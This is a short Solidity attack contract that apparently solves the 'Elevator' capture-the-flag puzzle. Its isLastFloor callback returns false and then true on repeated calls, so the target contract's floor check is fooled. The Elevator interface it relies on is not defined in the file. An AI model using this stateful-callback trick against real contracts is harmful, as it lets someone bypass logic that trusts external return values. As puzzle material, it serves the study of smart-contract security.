pragma solidity ^0.8.0;

contract Hack {
    Elevator private immutable target;
    uint private called;

    constructor (address _target) {
        target = Elevator(_target);
    }

    function hackk() external {
        target.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        called++;
        return called > 1;
    }
}